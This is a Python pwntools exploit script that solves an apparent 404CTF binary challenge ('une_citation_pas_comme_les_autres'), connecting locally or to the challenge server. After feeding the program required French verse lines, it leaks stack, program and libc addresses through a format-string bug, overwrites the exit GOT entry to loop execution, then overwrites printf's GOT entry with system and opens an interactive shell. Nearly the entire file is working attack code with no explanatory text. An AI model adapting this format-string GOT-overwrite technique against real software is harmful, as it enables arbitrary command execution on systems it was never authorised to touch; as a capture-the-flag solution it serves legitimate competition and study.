#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("une_citation_pas_comme_les_autres_2_2_patched")
libc = ELF("./libc-2.27.so")

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)


rop = ROP(exe)

host, port = "challenges.404ctf.fr", "30242"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])

sla('>>> ' , '1')
sla('>>> ' , '1')
sla('[Vous] : ', "M'accuser, - justes dieux ! - De n'aimer plus... quand... j'aime plus !");
sla('[Vous] : ', "L'amour grandit berce dans mon ame inquiete... Que ce... cruel marmot prit pour... barcelonnette !")
sla('[Vous] : ', "Aussi l'ai-je tente, mais... tentative nulle. Ce... nouveau-ne, Madame, est un petit... Hercule.")
sla('[Vous] : ', "De sorte qu'il... strangula comme rien... Les deux serpents... Orgueil et... Doute.")

sla('[Vous] : ', '.%64$p..%65$p..%79$p.')
stack = int(rcu('.','.'),16)
logleak('stack', stack)
exe.address = int(rcu('.','.'),16) - 0x1132
logleak('prog base', exe.address)
libc.address = int(rcu('.','.'),16) - 0x21c87
logbase()
onegadgets = one_gadget(libc.path, libc.address)

fmt = fmtstr_payload(32, {exe.got['exit']: exe.address+0x970}, write_size='short')
sla('prie.\n', fmt)


sla('[Vous] : ', "\nM'accuser, - justes dieux ! - De n'aimer plus... quand... j'aime plus !");
sla('[Vous] : ', "L'amour grandit berce dans mon ame inquiete... Que ce... cruel marmot prit pour... barcelonnette !")
sla('[Vous] : ', "Aussi l'ai-je tente, mais... tentative nulle. Ce... nouveau-ne, Madame, est un petit... Hercule.")
sla('[Vous] : ', "De sorte qu'il... strangula comme rien... Les deux serpents... Orgueil et... Doute.")

fmt = fmtstr_payload(32, {exe.got['printf']: libc.sym['system']}, write_size='short')
sla('[Vous] : ', fmt)


p.interactive()

